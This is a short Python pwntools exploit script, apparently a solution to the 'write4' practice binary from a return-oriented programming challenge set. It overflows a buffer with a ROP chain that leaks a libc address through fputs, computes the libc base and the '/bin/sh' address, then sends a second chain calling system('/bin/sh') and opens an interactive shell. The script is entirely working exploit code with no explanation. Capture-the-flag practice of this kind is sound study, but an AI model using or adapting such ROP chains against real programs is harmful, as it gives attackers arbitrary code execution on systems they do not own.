#!/usr/bin/env python

from pwn import *

p = process("./write4")

p.recv(1024)

payload = (
    "\x90" * 40 +
    p64(0x400893) + # pop rdi ; ret
    p64(0x601070) + # stdin@GLIBC_2.2.5 + 0
    p64(0x4005d0) + # fputs
    p64(0x4007b5) # pwnme func
)

p.sendline(payload)

data = p.recv(1024)[:6].ljust(8, "\x00")
leak_stdin = u64(data)
base = leak_stdin - 0x3c48e0
bin_sh = base + 0x18cd57

payload = (
    "\x90" * 40 +
    p64(0x400893) + # pop rdi ; ret
    p64(bin_sh) + # /bin/sh
    p64(0x4005e0) + # system@plt
    p64(0x4242424242424242)
)

p.sendline(payload)
p.interactive()

p.close()
